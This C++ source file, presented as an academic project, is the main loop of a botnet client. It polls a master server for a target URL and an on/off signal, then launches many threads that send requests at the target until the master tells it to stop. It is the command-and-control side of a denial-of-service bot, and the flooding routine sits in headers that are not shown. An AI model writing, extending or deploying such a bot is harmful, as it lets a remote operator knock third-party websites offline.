// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

#include <iostream>
#include <string>
#include <mutex>
#include <map>
#include <chrono>
#include <thread>
#include <cpr/cpr.h>
#include <unistd.h>

#include "managing_threads.hpp"
#include "task_for_thread.hpp"
#include "parse_config.hpp"

enum STATUS_CODES
{
    OK = 0,
    INVALID_NUM_OF_ARGS = 1,
};

int main(int argc, char *argv[])
{
    if (argc > 4 || argc < 4)
    {
        std::cout << "Invalid number of args" << std::endl;
        return INVALID_NUM_OF_ARGS;
    }
    const std::string path_to_cfg = "./data/config.cfg";
    std::map<std::string, std::string> config_map = parse_config(path_to_cfg);
    const std::string MASTER_ADDR = config_map["MASTER_ADDR"];
    const std::string TARGET_RECEIVER = config_map["GET_TARGET"];
    const std::string PING_RECEIVER = config_map["CONNECT"];
    const unsigned int NUMBER_OF_THREADS = std::stoi(argv[1]);
    const unsigned int REQUESTS_PER_POST = std::stoi(argv[2]);
    const unsigned int SLEEP = std::stoi(argv[3]);

    const std::string RECEIVE_TARGET = MASTER_ADDR + TARGET_RECEIVER;
    const std::string RECEIVE_PING = MASTER_ADDR + PING_RECEIVER;

    std::atomic<bool> STATUS = false;

    while (true)
    {
        cpr::Response target = cpr::Get(cpr::Url{RECEIVE_TARGET});
        cpr::Response connect_status = cpr::Get(cpr::Url{RECEIVE_PING});
        std::cout << "Target URL: " << target.text << std::endl
                  << "Connect status:" << connect_status.text << std::endl;
        cpr::Url URL = cpr::Url{target.text};
        if (connect_status.text == "true")
        {
            std::cout << "Connected" << std::endl;
            STATUS = true;
            cpr::Response target = cpr::Get(cpr::Url{RECEIVE_TARGET});
            std::thread t = std::thread([&NUMBER_OF_THREADS, &STATUS, &URL, &REQUESTS_PER_POST]()
                                        { managind_threads(task_for_thread, NUMBER_OF_THREADS, URL, std::ref(STATUS), REQUESTS_PER_POST); });
            std::cout << "Bot working" << std::endl;
            while (connect_status.text != "false")
            {
                sleep(SLEEP);
                connect_status = cpr::Get(cpr::Url{RECEIVE_PING});
            }
            STATUS = false;
            t.join();
            connect_status = cpr::Get(cpr::Url{RECEIVE_PING});
        }
        else if (connect_status.text == "false")
        {
            std::cout << "Ready to connect" << std::endl;
            STATUS = false;
            cpr::Response target = cpr::Get(cpr::Url{RECEIVE_TARGET});
            connect_status = cpr::Get(cpr::Url{RECEIVE_PING});
        }
        sleep(SLEEP);
    }

    return OK;
}
